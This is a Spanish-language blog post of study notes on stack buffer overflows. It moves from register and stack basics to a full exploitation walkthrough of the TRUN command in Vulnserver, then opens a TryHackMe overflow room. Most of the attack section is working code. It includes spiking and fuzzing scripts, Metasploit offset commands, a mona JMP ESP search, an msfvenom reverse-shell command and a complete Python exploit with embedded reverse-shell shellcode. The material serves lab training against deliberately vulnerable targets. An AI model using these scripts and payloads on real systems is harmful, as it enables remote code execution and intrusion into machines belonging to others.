---
layout: post
title: 7.BufferOverflow.
subtitle: An introduction to Buffer Overflow.
tags: [thm]
---
## 0. Índice.

- 1 Presentación del material.
- 2 BufferOverFlow Explained.
- 3 Python3.
- 4 Tryhackme's BufferOverflow.

### 1. Presentación del material.

Estos son unos apuntes construidos a partir del siguiente [vídeo](https://www.youtube.com/watch?v=ncBblM920jw&t=151s&ab_channel=TheCyberMentor). y de la siguiente [página](https://payatu.com/understanding-stack-based-buffer-overflow)

Para la realización de los mismos se ha utilizado:

- Máquina Windows 10 hosteada virtualmente (Virtualbox).
- [Vulnserver](https://www.youtube.com/watch?v=ncBblM920jw&t=151s&ab_channel=TheCyberMentor)
- [Inmunity Debugger](https://www.youtube.com/watch?v=ncBblM920jw&t=151s&ab_channel=TheCyberMentor)

<br />

### 2. BufferOverFlow Explained.

#### 2.1. Memory Fundamentals.

**Registers**

*Memoria* es el término utilizado para hablar de una herramienta empleada para guardar datos de rápido acceso asociados a un programa que se está ejecutando, un proceso. Cuando un programa se ejecuta se forma un proceso que corre gracias a que pueden guardarse datos asociados al mismo (como el código a ejecutar, espacio para funciones, etc) en memoria de forma que el procesador tiene rápido acceso a los mismos.

Uno de los tipos de los dispositivos de memoria que nos interesa estudiar son los *CPU Registers*. Estos son localizaciones de memoria de muy rápido acceso para el procesador en el que se aloja información utilizada de forma frecuente por el mismo. Existen muchos de diversos tipos en función de su propósito aunque a nosotros nos interesan los siguientes:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221017165427.png' | relative_url }}" text-align="center"/>
</div>

- *Acumulador*: Empleado en operaciones aritméticas.
- *Counter*: Usado en bucles o instrucciones de rotación.
- *Data*: Usado en operaciones de Input/Output y también en operaciones aritméticas.
- *Base*: Registro empleado a modo de puntero, que apunta al 'data'.
- *Stack Pointer*: Usado como puntero que apunta al *top* del stack (esto se entenderá más adelante).
- *Stack Base Pointer*: Usado como puntero que apunta al *base* del stack.
- *Source*: Apunta a la fuente (source) en 'stream operations'.
- *Destination*: Apunta al destino en 'stream operations'.

Otros registros también incluyen:

- *Flag Register*: Empleado en funciones aritméticas y debugging.
- *Segment Registers*: Empleados como punteros que apuntan a segmentos concretos de memoria.
- *Instruction Register*: Apunta a la dirección de la siguiente instrucción assembly en ser ejecutada.

<br />

**Memory Structure**

Como hemos dicho, la memoria es una herramienta que guarda datos asociados a procesos. Esta está constituida por direcciones de memoria ordenadas. Estas a su vez se organizan por rangos con diferentes propósitos tal y como se puede ver en la imagen:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221017173638.png' | relative_url }}" text-align="center"/>
</div>

- *Text*: Contiene un mapeo en memoria del ejecutable que inicia el proceso (imagen) en binario.
- *Data*: Variables globales y estáticas inicializadas.
- *BSS*: Variables globales y estáticas no inicializadas.
- *Heap*: Variables dinámicamente alojadas.
- *Memory Mapping*: Mapeo de ficheros auxiliares como librerias.
- *Stack*: Parámetros y variables locales de cada *thread*. (Ver Windows Internals).
- *Kernel Spacel*: Reservados para funciones del kernel.

<br />

**Stack Structure**

A su vez, la región asociada al *stack* está compuesto por rangos de memorias denominadas como *stack frames* asociadas a un determinado proceso o función en el código del ejecutable que se está procesando. El stack funciona en la métodología "last in - fist out", esto es, el último elemento que se añade a la pila es el primero que sale antes de que salgan los restantes elementos que integran el Stack:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221018120233.png' | relative_url }}" text-align="center"/>
</div>

Los *stack frames* son elementos de memoria que trabajan sobre un mismo proceso o función, en más detalle podemos ver por ejemplo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221018120650.png' | relative_url }}" text-align="center"/>
</div>

Que el stack contiene 3 stackframes, y cada stack frame contiene una serie de instrucciones que refieren al mismo proceso. Estos stack frames están compuestos por los mismos elementos:

- En primer lugar tenemos las variables que serán declaradas dentro de la función.
- El puntero EBP que apunta directamente a la base del stackframe.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221018121723.png' | relative_url }}" text-align="center"/>
</div>

- La instrucción return o EIP (Extended Instruction Pointer), que salta (popea) nada más terminar la función de procesarse para apuntar a la siguiente instrucción a ser ejecutada.
- Los parámetros junto con los cuales se ha llamado a la función.

Así, supongámos que tenemos la siguiente pieza de código escrito en C:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221018122030.png' | relative_url }}" text-align="center"/>
</div>

Su análogo en la estructura del stack sería:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221018122112.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que los datos se acumulan en el stack a medida que el código se va procesando y que la metodología 'Last-In First-Out'

<br />

<br />

#### 2.2. Buffer Overflows Made Easy.

**Anatomy of Memory**

Como hemos indicado, la memoria consiste en un conjunto de direcciones ordenadas numéricamente de forma que van desde menor o el 'bottom' de la memoria al mayor valor o 'top' de la memoria:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019093501.png' | relative_url }}" text-align="center"/>
</div>

Nos concentraremos sobre todo en la parte de la memoria denominada como el 'stack', echando un vistazo más de cerca el Stack contiene las siguientes partes tal y como hemos visto en la sección anterior:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019093807.png' | relative_url }}" text-align="center"/>
</div>

- *ESP (Extended Stack Pointer)*: Se trata de un puntero que apunta a la cima del stackframe.
- *Buffer Space*: En el que se almacenan las variables que se declaran dentro de la función a la que está asociada el stack frame.
- *EBP (Extended Base Pointer)*: Se trata de un puntero que apunta a la base del stackframe.
- *EIP (Extended Instruction Pointer)*: Se trata de un puntero que apunta a la siguiente instrucción a ser ejecutada.

<br />

**Buffer Space Overflow**

Concretamente lo que nos interesa es la parte del stack denominada 'Buffer Space' que contiene los datos asociados al interior de la función de que se está procesando en dicho stackframe. En un sentido técnico, *el Buffer Overflow consiste en una malconfiguración que permite la sobreescritura de otras partes del stack (EIP) induciendo al procesador a la ejecución de código malicoso*.

En un contexto normal, el desbordamiento de contenido se maneja correctamente e impide que el contenido por exceso pase a direcciones de memoria ajenas al Buffer Space y pertenencientes a otras secciones del stack.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019101209.png' | relative_url }}" text-align="center"/>
</div>

Sin embargo, si esto no se prepara adecuadamente, el exceso de datos pasa a ocupar direcciones de memoria dentro del rango asociado al EBP y posteriormente a el EIP:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019101258.png' | relative_url }}" text-align="center"/>
</div>

Esto tiene un alto riesgo debido a que el EIP le dice al procesador qué instrucción ejecutar a continuación y su sobreescritura, es decir, el cambio de contenido de este puntero, puede conducir, como hemos dicho antes, a que el procesador ejecute una instrucción potencialmente maliciosa de un atacante, como un shellcode.

<br />

#### 2.3. Pasos para realizar un Buffer Overflow.

**Overall**

Los pasos que un atacante da para encontrar y realizar satisfactoriamente un Buffer Overflows son los siguientes:

- *Spiking*: Metodo para encontrar una parte vulnerable del código.
- *Fuzzing*: Metodo para testear si la parte potencialmente vulnerable es de hecho 'breakable'.
- *Finding the Offset*: Encontramos el punto concreto de ruptura.
- *Overwriting the EIP*: A través del offset concreto introducimos la cantidad de datos necesarios para sobreescribir el EIP.
- *Cleanup job*: Una vez hemos alterado el EIP hay que realizar trabajkos de limpieza como Finding Bad Characters, Finding the Right Module.
- *Generating the ShellCode*: Generamos el código malicioso y hacemos que el EIP apunte sobre el shellcode para generar un reverseshell.

<br />

##### 2.3.1. Spiking.

**Asentando el material**

En primer lugar, en nuestra máquina virtual de Windows 10 desactivamos Windows Defender y ejecutamos Vulnserver e Immunity Debugger con permisos de administrador.

Seguidamente en Immunity Debugger enlazamos Vulnserver:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019130441.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019130533.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019130650.png' | relative_url }}" text-align="center"/>
</div>

Observamos que abajo a la derecha aparece un recuadro amarillo que dice 'Paused', le damos al botón de play en la parte superior del programa y debería de cambiar a running:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019130737.png' | relative_url }}" text-align="center"/>
</div>

Una vez que tenemos el servicio corriendo, este será accesible desde el exterior tal y como se puede ver con Netcat en el puerto 9999 de la máquina víctima:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019131523.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Spiking**

Ahora, veámos cómo podemos saber si este servicio es vulnerable. Este servicio admite la introducción de una serie de comandos que se ejecutan como binarios, programas que se procesan en memoria como hemos comentado antes. Vamos a testear si alguno de los comandos se procesan de manera inadecuada a través del 'spiking'.

La premisa consiste en que si envíamos contenidos de datos muy grandes y conseguimos desbordar el BufferSpace lograremos que el programa 'crashee' de lo contrario seguirá como si no estuviera pasando nada.

Vamos a utilizar una herramienta llamada [generic_send_tcp](https://resources.infosecinstitute.com/topic/intro-to-fuzzing) esta es una herramienta de SPIKE scripting, concretamente es un intérprete de .spk scripts escritos en C para enviar datos a servicios de red.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019165607.png' | relative_url }}" text-align="center"/>
</div>

Podemos ver en la imágen que necesitamos pasar un host, un puerto, un script SPK que contiene las acciones que el intérpreta va a realizar para terminar enviándo una iteración de datos al host indicado.

Así, en primer lugar, utilizamos el siguiente script para spikear el comando STATS:

```spk
s_readline();
s_string("STATS ");
s_string_variable("0");
```

En el siguiente comando:

```bash
./generic_send_tcp <HOST> 9999 stats.spk 0 0
```

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019173540.png' | relative_url }}" text-align="center"/>
</div>

Este comando a utilizado la herramienta generic_send_tcp para enviar al puerto 9999 del host establecido y primero a leido el mensaje de entrada

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019173710.png' | relative_url }}" text-align="center"/>
</div>

Y seguidamente a envíado el string "STATS 0" con cada vez más datos, primero 10, luego 100, luego 1000, luego 2000 con la finalidad de comprobar si el servicio crashea.

Por otra parte, como el comando STATS está (intencionalmente), bien gestionado, nada ha ocurrido, en Immunity Debugger se puede ver que todas las peticiones se han procesado correctamente

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019173858.png' | relative_url }}" text-align="center"/>
</div>

Y en la CMD desde la que hemos iniciado Vulnserver.exe se puede comprobar que todo ha ido con normalidad:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019173940.png' | relative_url }}" text-align="center"/>
</div>

Con lo que, transcurrido un tiempo razonable en el que no ocurre nada destacable dejamos de spikear el comando y pasamos al siguiente.

Ahora, acudimos a uno que sabemos que es intencionalmente vulnerable para observar la diferencia. De nuevo, utilizamos el siguiente script:

```spk
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

En el siguiente comando:

```bash
./generic_send_tcp <HOST> 9999 trun.spk 0 0
```

De nuevo, lo que hacemos es leer la primera línea del servicio y seguidamente enviar "TRUN 0" con cada vez más caracteres a la espera de comprobar si ocurre algún fallo.

Eventualmente, observamos que:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019174523.png' | relative_url }}" text-align="center"/>
</div>

El intérprete nos comunica que la primera línea que el servicio comunica al conectarse es que no se ha podido establecer una conexión, esto es un indicio de que probablemente, el servicio a crasheado y el comando es vulnerable.

De vuelta a Immunity Debugger observamos que ha habido una ruptura abrupta de las instrucciones que se procesan y los registros muestran una sobreescritura:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019175149.png' | relative_url }}" text-align="center"/>
</div>

Recordamos que '41' es el caracter 'A' en hexadecimal, de forma que el EIP se ha sobreescrito y el puntero ya no apunta a una instrucción real (recordamos que el EIP apunta a la siguiente instrucción que el CPU debe procesar) y por ende el servicio crashea.

A su vez, la terminal que poseía el ejecutable Vulnserver.exe ha cerrado:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221019175332.png' | relative_url }}" text-align="center"/>
</div>

Luego, efectivamente, el servicio a crasheado y el BufferSpace se ha desbordado derivando en una sobreescritura del resto de elementos del stack en el comando TRUN.

<br />

#### 2.4. Fuzzing.

Una vez hemos descubierto un comando vulnerable que podemos hacer crashear con el "Spiking" vamos a averiguar la cantidad exacta de bytes que necesitamos para desbordar el buffer y hacer crashear el programa con el "Fuzzing".

Esta técnica es relativamente similar al spiking; consiste en enviar progresivamente grandes cantidades de datos hasta hacer creashear el servicio. Sin embargo, en lugar de hacerlo entre comandos lo hacemos con uno que ya sabemos que es vulnerable y variamos entre cantidades más pequeñas para obtener una información más precisa de cuántos datos hacen falta para desbordar el comando que sabemos que es vulnerable.

En lugar de utilizar una herramienta prehecha vamos a emplear el siguiente script escrito en Python:

```python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
try:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('<WinIP>',9999))

s.send(('TRUN /.:/'+ buffer))
s.close()
sleep(1)
buffer = buffer + "A"*100

except:
print "Fuzzing crasehd at %s bytes" % str(len(buffer))
sys.exit()
```

Este último abre en bucle abre una conexión con el servicio y le envía un string para que procese el comando TRUN junto con una cantidad de datos que se incrementa con el paso de los bucles. En el momento en el que el servicio crashea se captura una excepción que nos devuelve los bytes que contenía el buffer en el momento de crashear.

Así, lanzamos el script, estamos pendientes del Immunity Debugger y en el momento en el que crashea recogemos la excepción:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221021123517.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, los bytes que se necesitan para desbordar el Buffer Space rondan alrrededor de los 2000 bytes.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221021124504.png' | relative_url }}" text-align="center"/>
</div>

<br />

#### 2.5. Finding the offset.

Ahora que sabemos aproximadamente cuándo crashea, vamos a utilizar una herramienta del entorno de Metasploit para capturar exactamente el número de bytes que sobreescriben el EIP ya que este es el registro cuyo contenido nos interesa controlar.

En primer lugar empleamos el comando:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crashedbytes>
```

Donde en lugar de \<crashedbytes> escribimos los bytes en los que aproximadamente crashea el servicio:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221021132419.png' | relative_url }}" text-align="center"/>
</div>

Esto nos da un patrón que mide 3000 bytes, lo lanzaremos contra el servicio seguros de que va a crashear y luego observaremos con Immunity Debugger el segmento del patrón que ha sobreescrito el EIP obtiendo así el offset concreto en el que se comienza a sobreescribir el registro.

De esta forma, utilizamos el siguiente código Python:

```python
import sys, socket

offset="<pattern>"

try:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('<WinIP>',9999))
s.send(('TRUN /.:/' + offset))
s.close()

except:
print "Error connecting to server"
sys.exit()
```


Para lanzar una sola vez el data sobre el servicio en el comando vulnerable.
Al lanzarlo, obtenemos el crasheo y vemos en Immunity Debugger que el EIP se ha sobreescrito con el valor "386F4337".

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221021132533.png' | relative_url }}" text-align="center"/>
</div>

De esta manera, introducimos los datos en el siguiente comando:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
```

Y obtenemos que el offset concreto está en el byte 2003:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221021132842.png' | relative_url }}" text-align="center"/>
</div>

Esto significa que cuesta 2003 bytes llegar hasta el valor que sobreescribirá el registro EIP.

<br />

#### 2.6. Overriding the EIP.

Ahora, sabemos que cuesta 2003 bytes llegar al comienzo del EIP y además sabemos que el EIP tiene 4 bytes de largo. De esta forma, ahora loque queda es sobreescribir estos bytes.

Para demostrar esta tesis vamos a reutilizar el código python que hemos escrito en la sección anterior y vamos a reescribirlo de forma que quede como sigue:

```python
import sys, socket

offset="A"*2003 + "B"*4

try:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('<WinIP>',9999))
s.send(('TRUN /.:/' + offset))
s.close()

except:
print "Error connecting to server"
sys.exit()
```

El objetivo se vuelve evidente. Si estamos en lo cierto, después de utilizar este código podremos observar que el valor del registro EIP consta de cuatro Bs. Y efectivamente:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024082925.png' | relative_url }}" text-align="center"/>
</div>

Podemos observar que el registro ha cambiado por cuatro "42" (B en hexadecimal).

<br />

#### 2.7. Finding bad characters.

La forma de sacar ventaja de este hallazgo pasa por generar un código malicioso denominado "shell code" que será ejecutado una vez tomemos control del EIP y lo utilizemos para indicar al procesador que la próxima instrucción que debe ejecutar involucra al malware.

Antes de llegar a desarrollar este código maliciosos existe un paso previo que tiene que ver con encontrar unos caracteres específicos "bad characters". Estos no son más que caracteres indeseados que pueden provocar un mal funcionamiento del shellcode debido al uso que el procesador hace de ellos en el procesamiento del programa debido al uso que de ellos hace el mismo.

Para identificar 'badcharacteres' empleamos la siguiente técnica en la que utilizamos la siguiente [herramienta](https://github.com/cytopia/badchars) para generar caracteres en distintos lenguajes de programación.

En primer lugar, reunimos todos los caracteres hexadecimales posibles y los enviamos justo después de la instrucción que sobreescribe el EIP:

```python
import sys, socket

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

offset="A"*2003 + "B"*4 + badchars

try:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('<WinIP>',9999))
s.send(('TRUN /.:/' + offset))
s.close()

except:
print "Error connecting to server"
sys.exit()
```

Observemos que este código introduce el código referente al badchars después de la sobreescritura del EIP, esto se hace porque queremos ver cómo se va a procesar el código de shellcode que vamos a introducircque irá después del valor del EIP en el exploit.

Seguidamente, estos caracteres pueden ser observados en el "hexdump" del registro ESP (Stack Pointer):

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024085926.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024090008.png' | relative_url }}" text-align="center"/>
</div>

Ahí encontramos los caracteres enviados en la lista anterior. En este caso, vulnserver es un servidor muy simple y no tenemos badcharacteres pero, en el caso de tenerlos, lo sabríamos porque en el hexdump el lugar del caracter ponzoñoso tendríamos algo que no tiene sentido en lo que debería de ser una lista ordenada de números hexadecimales, por ejemplo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024090249.png' | relative_url }}" text-align="center"/>
</div>

Ahí podemos observar que muchos caracteres están sustituidos por una expresión que no cuadra aunque esta es siempre la misma no tiene por qué ser siempre así, insistimos en que sencillamente es algo que no cuadra.

Una vez identificados deberemos descartarlos de cara a generar el payload.

<br />

#### 2.8. Finding the Right Module.

En esta sección debemos buscar el módulo correcto, esto es una DLL que no tenga protecciones de memoria con la finalidad de conseguir que el procesador salte a una instrucción que le haga procesar esta DLL en la que habremos incluido nuestra shell code maliciosa.

En primer lugar, empleamos el [mona](https://github.com/corelan/mona) que se trata de una herramienta que se puede utilizar de manera conjunta con Immunity Debugger. Lo descargamos y lo ponemos en la carpeta: "C:>Program Files (x86)>Immunity Inc>Immunity Debugger>PyCommands":

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024113515.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente tecleamos "!mona modules" en la barra de comandos del programa y pulsamos Enter:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024114558.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024114624.png' | relative_url }}" text-align="center"/>
</div>

Podemos ver que el sistema ofrece una lista de módulos y las opciones de seguridad que tiene cada uno, nos interesa un módulo asociado al servicio Vulnserver que tenga todo en falso:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024114835.png' | relative_url }}" text-align="center"/>
</div>

Este módulo es el "essfunc.dll". El objetivo es sustituir este módulo poruno malicioso y hacer que el programa lo procese. Para ello l que hacemos es colocar en el registro EIP el valor de la dirección de memoria de este módulo, con lo que necesitamos encontrar la dirección en la que este módulo se encuentra para colocarla como valor del registro EIP.

Para ello empleamos el comando: "!mona find -s "\\xff\\xe4 -m essfunc.dll", este comando nos llevará al puntero que necesitamos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024115527.png' | relative_url }}" text-align="center"/>
</div>

Tenemos una lista de punteros, seleccionamos uno (625011af) y lo incluímos en nuestro código de Python:

```python
import sys, socket

offset="A"*2003 + "\xaf\x11\x50\x62"

try:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('<WinIP>',9999))
s.send(('TRUN /.:/' + offset))
s.close()

except:
print "Error connecting to server"
sys.exit()
```

Notemos que los bytes están con el prefijo hexadecimal y los bytes están colocados al revés, estos es por cuestiones relativas a la arquitectura x86.

Así, al lanzar el programa obtenemos:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024123100.png' | relative_url }}" text-align="center"/>
</div>

El EIP ha quedado sobreescrito con la dirección de memoria que le lleva al registro.

<br />

#### 2.9. Generating Shellcode and Exploiting.

Ahora todo lo que queda es generar la shellcode con Msfvenom:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
```

Observemos por otra parte que la opción '-b' nos permite desechar los badcharacters, pero como no hemos encontrado ninguno sólo añadimos el 00.

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024130858.png' | relative_url }}" text-align="center"/>
</div>

Copiamos y pegamos el resultado en el siguiente código python:

```python
import sys, socket

overflow =(
"\xbb\x6e\x1f\xfc\x39\xdd\xc6\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x5f\x0e\x03\x31\x11\x1e\xcc\x31\xc5\x5c"
"\x2f\xc9\x16\x01\xb9\x2c\x27\x01\xdd\x25\x18\xb1\x95\x6b\x95"
"\x3a\xfb\x9f\x2e\x4e\xd4\x90\x87\xe5\x02\x9f\x18\x55\x76\xbe"
"\x9a\xa4\xab\x60\xa2\x66\xbe\x61\xe3\x9b\x33\x33\xbc\xd0\xe6"
"\xa3\xc9\xad\x3a\x48\x81\x20\x3b\xad\x52\x42\x6a\x60\xe8\x1d"
"\xac\x83\x3d\x16\xe5\x9b\x22\x13\xbf\x10\x90\xef\x3e\xf0\xe8"
"\x10\xec\x3d\xc5\xe2\xec\x7a\xe2\x1c\x9b\x72\x10\xa0\x9c\x41"
"\x6a\x7e\x28\x51\xcc\xf5\x8a\xbd\xec\xda\x4d\x36\xe2\x97\x1a"
"\x10\xe7\x26\xce\x2b\x13\xa2\xf1\xfb\x95\xf0\xd5\xdf\xfe\xa3"
"\x74\x46\x5b\x05\x88\x98\x04\xfa\x2c\xd3\xa9\xef\x5c\xbe\xa5"
"\xdc\x6c\x40\x36\x4b\xe6\x33\x04\xd4\x5c\xdb\x24\x9d\x7a\x1c"
"\x4a\xb4\x3b\xb2\xb5\x37\x3c\x9b\x71\x63\x6c\xb3\x50\x0c\xe7"
"\x43\x5c\xd9\xa8\x13\xf2\xb2\x08\xc3\xb2\x62\xe1\x09\x3d\x5c"
"\x11\x32\x97\xf5\xb8\xc9\x70\xf0\x3c\xd3\x8f\x6c\x3f\xd3\x9e"
"\x30\xb6\x35\xca\xd8\x9e\xee\x63\x40\xbb\x64\x15\x8d\x11\x01"
"\x15\x05\x96\xf6\xd8\xee\xd3\xe4\x8d\x1e\xae\x56\x1b\x20\x04"
"\xfe\xc7\xb3\xc3\xfe\x8e\xaf\x5b\xa9\xc7\x1e\x92\x3f\xfa\x39"
"\x0c\x5d\x07\xdf\x77\xe5\xdc\x1c\x79\xe4\x91\x19\x5d\xf6\x6f"
"\xa1\xd9\xa2\x3f\xf4\xb7\x1c\x86\xae\x79\xf6\x50\x1c\xd0\x9e"
"\x25\x6e\xe3\xd8\x29\xbb\x95\x04\x9b\x12\xe0\x3b\x14\xf3\xe4"
"\x44\x48\x63\x0a\x9f\xc8\x83\xe9\x35\x25\x2c\xb4\xdc\x84\x31"
"\x47\x0b\xca\x4f\xc4\xb9\xb3\xab\xd4\xc8\xb6\xf0\x52\x21\xcb"
"\x69\x37\x45\x78\x89\x12")

offset="A"*2003 + "\xaf\x11\x50\x62" + "\90"*32 + overflow

try:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('<WinIP>',9999))
s.send(('TRUN /.:/' + offset))
s.close()

except:
print "Error connecting to server"
sys.exit()
```

Observemos que entre el overflow y el valor del EIP hemos añadido "trash" para garantizar un correcto funcionamiento del código.

Seguidamente, levantamos un listener de netcat en el puerto adecuado y lanzamos el script obteniendo:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024131500.png' | relative_url }}" text-align="center"/>
</div>

<br />

### 3. Python3.

Dado el hecho de que Python2 está obsoleto y superado por Python3, vamos a repetir las partes más esenciales del curso con Python3.

El script de envío de datos queda como sigue:

```python
import sys, socket
from time import sleep

buffer = "A" * 100

while True:
try:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('<WinIP>',9999))

payload = "TRUN /.:/" + buffer

s.send((payload.encode()))
s.close
sleep(1)
buffer = buffer + "A"*100

except:

print ("Fuzzing crashed at %s bytes" % str(len(buffer)))
sys.exit()
```

<br />

### 4. Tryhackme's Buffer Overflow.

#### 4.1. Buffer Overflow Prep.

Este 'room' usa un Windows de 32 bits con Immunity Debugger preinstalado. Nos conectamos a la máquina mediante el siguiente comando:

```bash
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.216.16 /workarea
```

Una vez en el escritorio tenemos una carpeta "vulnearble-apps > oscp"

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024185954.png' | relative_url }}" text-align="center"/>
</div>

Abrimos el Immunity Debugger como administradores y el ejecutable oscp y ligamos el ejecutable a Immunity Debugger como hemos hecho en el tutorial anterior y lo iniciamos:

Seguidamente, utilizamos netcat para conectarnos al servicio:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024191636.png' | relative_url }}" text-align="center"/>
</div>

<br />

**OVERFLOW 1. Scripting for Pentesters..md

- En primer lugar, configuramos un directorio de trabajo con Mona (recordamos, el comando de python embebido en Immunity Debugger):

```bash
!mona config -set workingfolder c:\mona\%p
```

<br />

- *Fuzzing*: En este caso, por el enunciado sabemos que el comando "OVERFLOW1" es vulnerable, así pasámos a la etapa de Fuzzing que, recordemos, se trata de una etapa en la que averiguamos el número de bytes con el crashea el servicio.

Creamos un fichero python en nuestra máquina Kali atacante con el siguiente código:

```python
import socket, time, sys

ip = "10.10.216.16"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
try:
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
s.settimeout(timeout)
s.connect((ip, port))
s.recv(1024)
print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
s.send(bytes(string, "latin-1"))
s.recv(1024)
except:
print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
sys.exit(0)
string += 100 * "A"
time.sleep(1)
```

Observemos que este código, en bucle, inicia una conexión con el servicio, le manda el comando acompañado de datos que van incrementando en cada iteración. Observamos que, tras la ejecución, el servicio crashea cerca de los 2000 bytes y el EIP está sobreescrito luego el crasheo se debe al desbordamiento del buffer:

<div style="text-align:center">
	<img src="{{ 'assets/img/THM/Pasted image 20221024195726.png' | relative_url }}" text-align="center"/>
</div>

<br />

